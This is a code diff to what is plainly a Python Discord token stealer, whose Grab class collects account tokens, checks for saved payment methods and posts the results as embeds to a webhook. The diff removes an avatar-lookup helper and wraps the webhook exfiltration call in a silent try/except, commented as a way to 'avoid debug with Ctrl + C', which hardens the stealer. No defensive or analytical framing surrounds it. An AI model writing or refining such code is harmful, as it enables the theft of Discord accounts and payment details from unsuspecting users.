@@ -86,13 +86,6 @@ class Discord:
 class Grab:
 
     def token_grab(token: str):
-        def getavatar(uid, aid) -> str:
-            url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}"
-            try:
-                urlopen(Request(url, headers=Discord.setheaders()))
-            except HTTPError:
-                url += ".gif"
-            return url
 
         def has_payment_methods(token) -> bool:
             has = False
@@ -182,7 +175,11 @@ class Grab:
                 "avatar_url": "https://repository-images.githubusercontent.com/430853217/b9e21ff2-b3eb-4775-a261-f9d83d4ee862",
                 "embeds": data,
                 "content": "@everyone" if pingme else ""}
-        return urlopen(Request(webhook, data=dumps(data).encode('utf-8'), headers=Discord.setheaders()))
+        # avoid debug with Ctrl + C
+        try:
+            return urlopen(Request(webhook, data=dumps(data).encode('utf-8'), headers=Discord.setheaders()))
+        except:
+            pass
 
 
 sent_tokens = []
